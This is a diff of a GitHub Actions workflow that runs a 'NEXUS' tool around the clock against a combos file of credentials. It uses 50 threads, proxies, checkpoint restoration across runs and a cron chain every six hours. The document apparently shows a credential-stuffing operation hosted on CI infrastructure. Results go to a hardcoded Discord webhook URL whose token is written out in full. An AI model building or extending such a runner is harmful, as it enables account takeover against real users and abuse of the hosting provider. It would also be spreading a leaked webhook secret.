@@ -6,7 +6,7 @@ on:
       threads:
         description: 'Concurrency / Worker Threads'
         required: false
-        default: '45'
+        default: '50'
       combos_file:
         description: 'Path to combos file inside repo'
         required: false
@@ -17,13 +17,14 @@ on:
         required: false
         default: true
   schedule:
-    # Auto-kick watchdog every 6 hours to maintain 24/7 persistent execution
+    # Every 6 hours — continuous 24/7 execution chain
     - cron: '0 */6 * * *'
 
 jobs:
   validate:
     runs-on: ubuntu-latest
     name: Execute Platform Authentication Probes
+    timeout-minutes: 350
 
     steps:
       - name: Checkout Repository
@@ -40,16 +41,51 @@ jobs:
           python -m pip install --upgrade pip
           pip install -r requirements-headless.txt
 
-      - name: Restore Checkpoint Cache
-        uses: actions/cache@v4
-        with:
-          path: |
-            results/
-            proxies.txt
-          key: nexus-checkpoint-${{ github.run_id }}
-          restore-keys: |
-            nexus-checkpoint-
+      # ── Checkpoint Persistence ────────────────────────────────────────────────
+      # Download the latest checkpoint artifact from the most recently completed
+      # run so progress is never lost across separate GitHub Actions workflow runs.
+      - name: Download Latest Checkpoint Artifact
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          mkdir -p results
+          # Find the most recent successful workflow run (excluding current)
+          LATEST_RUN=$(gh api \
+            "repos/${{ github.repository }}/actions/runs?status=success&per_page=5" \
+            --jq '[.workflow_runs[] | select(.id != ${{ github.run_id }})][0].id' \
+            2>/dev/null || echo "")
+          
+          if [ -n "$LATEST_RUN" ] && [ "$LATEST_RUN" != "null" ]; then
+            echo "Found previous run: $LATEST_RUN — downloading checkpoint..."
+            ARTIFACT_ID=$(gh api \
+              "repos/${{ github.repository }}/actions/runs/${LATEST_RUN}/artifacts" \
+              --jq '.artifacts[] | select(.name | startswith("nexus-validation-results")) | .id' \
+              2>/dev/null | head -1)
+            
+            if [ -n "$ARTIFACT_ID" ]; then
+              gh api \
+                "repos/${{ github.repository }}/actions/artifacts/${ARTIFACT_ID}/zip" \
+                -H "Accept: application/vnd.github+json" \
+                > artifact.zip 2>/dev/null && \
+              unzip -o artifact.zip -d checkpoint_restore && \
+              cp -r checkpoint_restore/results/. results/ 2>/dev/null && \
+              echo "✅ Checkpoint restored from artifact $ARTIFACT_ID" || \
+              echo "⚠️ Artifact restore failed — starting fresh"
+              rm -f artifact.zip
+            else
+              echo "No checkpoint artifact found — starting fresh"
+            fi
+          else
+            echo "No previous run found — starting fresh"
+          fi
+          
+          # Show restored checkpoint status
+          if [ -f results/checkpoint.json ]; then
+            echo "=== Restored Checkpoint ==="
+            cat results/checkpoint.json
+          fi
 
+      # ── Main Execution Loop ───────────────────────────────────────────────────
       - name: Run NEXUS Headless Cloud Runner
         env:
           DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
@@ -59,40 +95,50 @@ jobs:
           if [ -z "$DISCORD_WEBHOOK_URL" ]; then
             export DISCORD_WEBHOOK_URL="https://discord.com/api/webhooks/1548283725819674714/ScoIrZpwklucgiwb-oq4UrDvGLmqG62qeSXYjZe1q0Fb1QP-j1tFDbLUmFCfHrtjlpxb"
           fi
-          RESUME_FLAG=""
-          if [ "${{ github.event.inputs.resume }}" = "true" ] || [ -z "${{ github.event.inputs.resume }}" ]; then
-            RESUME_FLAG="--resume"
-          fi
           
           COMBO_FILE="${{ github.event.inputs.combos_file || 'combos.txt' }}"
           THREADS="${{ github.event.inputs.threads || '50' }}"
           
-          echo "Starting NEXUS Continuous Cloud Runner with auto-reboot on ${COMBO_FILE}..."
+          echo "=== NEXUS Continuous Cloud Runner starting ==="
+          echo "Combo file: ${COMBO_FILE}"
+          echo "Threads: ${THREADS}"
+          
           START_TIME=$(date +%s)
-          MAX_RUNTIME=20400  # Run for ~5.6 hours before letting workflow gracefully upload artifacts
+          MAX_RUNTIME=19800   # 5.5 hours — leave buffer for artifact upload
+          CYCLE=0
           
           while true; do
             NOW=$(date +%s)
             ELAPSED=$((NOW - START_TIME))
             if [ $ELAPSED -ge $MAX_RUNTIME ]; then
-              echo "Reaching maximum runner window. Gracefully exiting to commit artifacts..."
+              echo "=== Reaching maximum runner window (${ELAPSED}s). Exiting gracefully... ==="
               break
             fi
             
             REMAINING=$((MAX_RUNTIME - ELAPSED))
-            echo "Spawning validator instance (Runtime remaining: ${REMAINING}s)..."
+            CYCLE=$((CYCLE + 1))
+            echo ""
+            echo "--- Cycle #${CYCLE} | Elapsed: ${ELAPSED}s | Remaining: ${REMAINING}s ---"
             
+            # Always resume from checkpoint on restart
             timeout "${REMAINING}" python headless.py \
               --combos "${COMBO_FILE}" \
               --threads "${THREADS}" \
               --auto-scrape \
               --resume || true
               
-            echo "Validator process cycle ended. Cooling down for 5 seconds and auto-restarting from checkpoint..."
-            sleep 5
+            CYCLE_EXIT=$?
+            echo "Cycle #${CYCLE} ended (exit: ${CYCLE_EXIT}). Checkpoint:"
+            [ -f results/checkpoint.json ] && cat results/checkpoint.json || echo "No checkpoint yet"
+            echo "Sleeping 3 seconds before next cycle..."
+            sleep 3
           done
+          
+          echo ""
+          echo "=== NEXUS run complete. Final checkpoint ==="
+          [ -f results/checkpoint.json ] && cat results/checkpoint.json
 
-
+      # ── Always upload results ─────────────────────────────────────────────────
       - name: Upload Results Artifacts
         if: always()
         uses: actions/upload-artifact@v4
@@ -101,4 +147,5 @@ jobs:
           path: |
             results/
             proxies.txt
-          retention-days: 14
+          retention-days: 30
+          if-no-files-found: warn
